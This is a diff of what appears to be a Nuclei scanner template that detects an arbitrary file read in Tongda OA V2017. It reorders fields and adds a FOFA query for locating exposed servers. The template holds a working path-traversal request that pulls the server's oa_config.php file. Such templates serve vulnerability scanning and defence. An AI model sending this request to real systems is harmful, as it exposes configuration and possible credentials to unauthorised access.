@@ -1,5 +1,4 @@
 id: tongda-video-file-read
-
 info:
   name: Tongda OA V2017 Video File - Arbitrary File Read
   author: SleepingBag945
@@ -11,24 +10,22 @@ info:
   classification:
     cpe: cpe:2.3:a:tongda2000:office_anywhere_2017:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
+    fofa-query: icon_hash="1967132225"
     max-request: 1
+    product: office_anywhere_2017
     vendor: tongda2000
-  tags: tongda,lfi,vuln
-
+    verified: true
+  tags: lfi,tongda,vuln
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
-
-    matchers-condition: and
-    matchers:
+  - matchers:
       - type: word
         words:
-          - "$ROOT_PATH"
-          - "$ATTACH_PATH"
-
-      - type: status
-        status:
+          - $ROOT_PATH
+          - $ATTACH_PATH
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php'
